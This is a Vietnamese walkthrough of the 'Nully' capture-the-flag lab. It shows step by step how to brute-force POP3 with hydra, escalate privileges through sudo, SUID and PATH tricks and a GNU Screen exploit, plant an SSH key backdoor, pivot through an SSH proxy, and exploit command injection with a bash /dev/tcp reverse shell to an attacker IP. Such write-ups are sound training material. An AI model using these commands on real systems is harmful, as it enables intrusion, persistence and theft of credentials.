# Nully

Sau khi tải về và import thì thể sử dụng ngay được, ta cần config lại tên card mạng, tham khảo ở đây [Nully-Cybersecurity-/README.md at main · phucrio/Nully-Cybersecurity- (github.com)](https://github.com/phucrio/Nully-Cybersecurity-/blob/main/README.md)

Sau khi cài đặt thành công, bắt đầu vào việc thôi.

Vẫn như tất cả các bài trước, chúng ta cần phải tìm ra IP của máy đã, lúc này dùng nmap để scan

```python
nmap -T5 -sn 192.168.113.0/24
```

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled.png)

Có một host đó là `192.168.113.141` thực hiện scan các port

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%201.png)

Có 3 port đáng chú ý đó là 80, 110 và 2222. Thử vào port 80 

Ở port 80 này sẽ là các rule và đề bài

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%202.png)

Ta có thể vào bằng port 110 với credential: `pentester\qKnGByeaeQJWTjj2efHxst7Hu0xHADGO`

Khi scan port ta biết port này chạy dịch vụ POP3. Chúng ta cần biết 1 số câu lệnh và đây là 1 số câu lệnh cơ bản

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%203.png)

Giờ thì login vào

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%204.png)

Ở mail này mình biết được tên của admin mail server là Bob Smith, từ đây có thể liệt kê được các username có thể của admin ví dụ như: bob, smith, bob.s, s.bob,…

Sau khi có username rồi mình sẽ thực hiện brute force password của admin mail server bằng hydra

Vì có thể username liên quan đến bob rồi nên pass mình cũng grep trong rockyou theo bob để giảm số lượng request. Nếu vẫn không ra thì có thể brute force nguyên file rockyou (Giả sử đã biết username là bob)

```bash
cat /usr/share/wordlists/rockyou.txt | grep bob > /tmp/pass.txt
hydra -l bob -P /tmp/pass.txt pop3://192.168.113.141
```

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%205.png)

Sau khi bruteforce thành công, ta đã có credential: `bob/bobby1985`

Tiếp tục login vào với tài khoản vừa tìm được

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%206.png)

Sau khi login vào thì kiểm tra mà không có mail nào. Khi scan port, ta có port 2222 đang chạy dịch vụ ssh ⇒ Thử đăng nhập qua SSH

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%207.png)

Login thành công, giờ sẽ thực hiện leo quyền. Đầu tiên sẽ tìm với sudo right bằng lệnh `sudo -l`

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%208.png)

Có file `/opt/scripts/check.sh` này khi chạy với quyền `my2user` sẽ không yêu cầu pass. Tiếp tục check với file này

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%209.png)

Tài khoản bob là chủ sở hữu và có quyền ghi file ⇒ Thực hiện chèn thêm một đoạn `/bin/bash` vào file này, để khi thực hiện sẽ có 1 shell với quyền của `my2user`

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2010.png)

Ta sẽ thực hiện chạy file này với quyền của user `my2user`

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2011.png)

Đã leo lên được quyền `my2user`. Tiếp tục thực hiện leo quyền

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2012.png)

Tìm kiếm thì có lệnh zip sẽ được thực hiện với quyền của root mà không yêu cầu pass. Lên trang [GTFOBins](https://gtfobins.github.io/) tìm kiếm cách leo quyền qua lệnh zip. Ta sẽ thực hiện lần lượt các bước sau

```bash
TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
```

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2013.png)

Đã leo quyền thành công lên root và lấy được flag 1

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2014.png)

FLAG1: `2c393307906f29ee7fb69e2ce59b4c8a`

Để lần sau không cần phải thực hiện các bước trên mới leo được quyền root, ta sẽ để lại 1 backdoor để lần sau thực hiện ssh vào luôn.

Bước đầu tiên sẽ gen một ssh key bằng lệnh `ssh-keygen` trên máy attacker

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2015.png)

Sau khi gen thành công, truy cập vào directory `.ssh` và đọc file `id_rsa.pub` sau đó lưu lại nội dung file này

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2016.png)

Quay lại mail server, truy cập tới `/root/.ssh` tạo một file `authorized_keys` với nội dung vừa copy

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2017.png)

Từ bây giờ có thể ssh vào root@192.168.113.141 mà không cần pass

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2018.png)

Thử ifconfig xem card mạng, quan sát thấy địa chỉ máy này đang là `172.17.0.5`

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2019.png)

Thực hiện scan các host tồn tại trong dải mạng bằng lệnh

```bash
nmap -sn -T5 172.17.0.0/16
```

Thu được kết quả

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2020.png)

Với IP 172.17.0.1 có thể là IP của router, IP 172.17.0.5 đang là của máy hiện tại, ta thực hiện scan port từng host còn lại

- 172.17.0.2
    
    ![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2021.png)
    
- 172.17.0.3
    
    ![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2022.png)
    
- 172.17.0.4
    
    ![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2023.png)
    

Thấy host 172.17.0.3 có port 80 đang mở và chạy HTTP. Ta sẽ kiểm tra nó đầu tiên. Để truy cập tới 172.17.0.3 từ máy attacker sẽ có nhiều cách, mình chọn tạo một tunnel để kết nối tới host đó thông qua máy 192.168.113.141 này.

Đầu tiên mình sẽ tạo một kết nối tới máy 192.168.113.141 qua SSH đồng thời mở một port 1337 để làm cổng chuyển các request. Hiểu đơn giản là máy 192.168.113.141 sẽ là một cây cầu để kết nối attacker tới 172.17.0.3 qua port 1337

```bash
ssh root@192.168.113.141 -p 2222 -D 1337 -N
```

Tiếp theo mình sẽ config file `/etc/proxychains4.conf` để dùng công cụ `proxychains` chuyển mọi tools mình dùng đi qua cái proxy

```bash
sudo nano /etc/proxychains4.conf
```

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2024.png)

Giờ mình sẽ bắt đầu vào việc nào. Khi truy cập vào trang web

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2025.png)

Thực hiện dirsearch

```bash
proxychains dirsearch -u http://172.17.0.3/
```

Ta tìm thấy một directory `ping` và file `robots.txt`

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2026.png)

Nội dung robots.txt

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2027.png)

Truy cập tới `/ping`

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2028.png)

Truy cập tới `/ping/ping.php`. Khi truyền param host là một địa chỉ IP, server sẽ ping tới IP đó

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2029.png)

Khi ta truyền `?host= | ls -la #`. Server trả về kết quả của lệnh `ls -la` ⇒ CMDi

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2030.png)

Thực hiện reverse shell về máy attacker

```bash
bash -c "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.31.129.169%2F8989%200%3E%261"
```

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2031.png)

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2032.png)

Tiếp tục thực hiện leo quyền, sau khi tìm sudo right, thì sẽ tìm suid

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2033.png)

Quan sát thấy python3 có khả năng nhất và kiểm tra file đó

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2034.png)

File này khi chạy sẽ được chạy với quyền của `oscar` ⇒ Có thể leo lên quyền của `oscar`

Giờ chỉ cần import os và chạy là xong này

```bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2035.png)

Lấy được password

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2036.png)

Password: H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o

Giờ thì ssh vào tiếp nào

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2037.png)

Tiếp tục leo quyền lên root từ oscar

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2038.png)

Có file `/home/oscar/scripts/current-date` khả nghi, check trước

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2039.png)

File này khi chạy sẽ chạy với quyền của root, mà nó được tự code ⇒ Sử dụng strings để xem tận dụng được PATH không. Có sử dụng lệnh `date`

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2040.png)

Vậy mình sẽ viết một file date và đưa nó vào path

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2041.png)

Giờ sẽ chạy file `current_date` kia và lấy shell thôi

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2042.png)

Giờ là đọc flag

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2043.png)

FLAG2: 7afc7a60ac389f8d5c6f8f7d0ec645da

Mục tiêu tiếp theo đó chính là Database server. Bây giờ ta sẽ quay lại host 172.17.0.4

Như lúc nãy scan host này đang mở port 21 (FTP) và 22 (SSH)

Thử truy cập tới dịch vụ FTP qua user anonymous và server cũng bật người dùng anonymous này

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2044.png)

Ta đang có 1 folder và 1 file test có thể tận dụng này

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2045.png)

File test đó có size là 0 ⇒ Rỗng ⇒ Không đọc

Ta sẽ tập trung vào .folder và get những file trong đó về

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2046.png)

Khi đọc giải nén file zip kia lại cần có password

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2047.png)

Ta sẽ mang về máy attacker để crack nó

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2048.png)

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2049.png)

Thực hiện giải nén và đọc nội dung

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2050.png)

Credential: `donald:HBRLoCZ0b9NEgh8vsECS`

Tiếp tục ssh tới máy này bằng thông tin mới lấy được từ máy Mailserver

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2051.png)

Và tiếp tục leo quyền

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2052.png)

Ở đây có file `/usr/bin/screen-4.5.0` khá là lạ ⇒ Tập trung vào nó. Kiểm tra trên gtfobins không thấy khả quan nên sẽ đi tìm CVE, PoC liên quan. Tìm thấy 1 PoC liên quan đến version này [GNU Screen 4.5.0 - Local Privilege Escalation - Linux local Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/41154)

Thử chạy trực tiếp thì không ngon rồi

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2053.png)

Nên là mình phải tự chạy bằng tay các lệnh thôi

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2054.png)

Quay trở lại `/tmp`

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2055.png)

Giờ thì lên root thôi

![Untitled](Nully%20388742a9c9bd401fb7369174b9d9a3cc/Untitled%2056.png)

FLAG3: 16cb25d4789cdd7fa1624e6356e0d825b